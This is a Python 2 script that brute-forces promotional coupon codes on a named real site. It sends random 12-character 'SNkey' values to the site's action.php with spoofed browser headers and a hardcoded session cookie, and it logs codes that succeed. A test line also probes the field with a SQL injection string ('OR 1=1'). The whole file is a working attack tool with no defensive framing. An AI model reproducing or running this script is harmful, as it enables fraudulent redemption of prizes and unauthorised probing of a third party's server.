

import argparse
import urllib2
import urllib
import os
import re
import xml.etree.ElementTree as ET
from bs4 import BeautifulSoup

import httplib
import StringIO, gzip
import random
import time

_file_name = 'qiaqiafood.txt'
_url = 'http://hongbao.qiaqiafood.com/action.php'
# _file = None
_header = {'Origin': 'http://hongbao.qiaqiafood.com',
           'Accept': '*/*',
           'X-Requested-With': 'XMLHttpRequest',
           'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
           'Accept-Language': 'zh-CN,zh;q=0.8',
           'Referer': 'http://hongbao.qiaqiafood.com/',
           'Accept-Encoding': 'gzip, deflate',
           'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.48 Safari/537.36 QQBrowser/8.0.3197.400',
           'Host': 'hongbao.qiaqiafood.com',
           'Content-Length': '34',
           'Proxy-Connection': 'Keep-Alive',
           'Pragma': 'no-cache',
           'Cookie': 'PHPSESSID=3j98rbnq804eaas6jel0qcpqn2; CNZZDATA1253517292=528758234-1422188634-%7C1422188634'}

def gzdecode(data):
  compressedstream = StringIO.StringIO(data)
  gziper = gzip.GzipFile(fileobj=compressedstream)
  data2 = gziper.read()
  return data2

def try_code(num):
  opener = urllib2.OpenerDirector()
  handler = urllib2.HTTPHandler()
  opener.add_handler(handler)
  req = urllib2.Request(_url)
  # data = 'action=pcticket&SNkey='+num
  for (name, val) in _header.items():
    req.add_header(name, val)
  req.add_data(num)
  req.add_header('Content-Length', str(len(num)))
  try:
    response = opener.open(req)
  except:
    # print '10060 error, sleep 10 second'
    opener.close()
    print 'sleep'
    time.sleep(1)
    return '00'
  content = response.read()
  bs_page =  BeautifulSoup(gzdecode(content))
  print bs_page
  opener.close()
  return bs_page.find('p').contents[0][11]+bs_page.find('p').contents[0][24]

def code_write(fp, num):
  fp.writelines(num)
  fp.writelines('\n')

_test = True
# _test = False
def main():
  _file = open(_file_name, 'a')
  if _test:
    code = "D1DGEDF3FSGH OR 1=1"
    code = "111111111111"
    data = {'action':'pcticket',
            'SNkey':code}
    # data = urllib.urlencode(data)
    data = 'action=pcticket&SNkey='+code
    print data
    d = try_code(data)
    print d
    return
  while True:
    code = ''
    for i in range(1, 13):
      # a = random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ')
      a = random.choice('23456789ABCDEFGHJKLMNPQRSTUVWXYZ')
      code = code + a
    print 'try ->>>>>>>>>>>>>>>>>>>>>>>'+code
    data = {'action':'pcticket',
            'SNkey':code}
    data = urllib.urlencode(data)
    d = try_code(data)
    print d
    # print code+'-------------------->'+d
    if d == '00':
      continue
      break
    else:
      code_write(_file, code)
      break
  _file.flush()
  _file.close()


if __name__ == '__main__':
  main()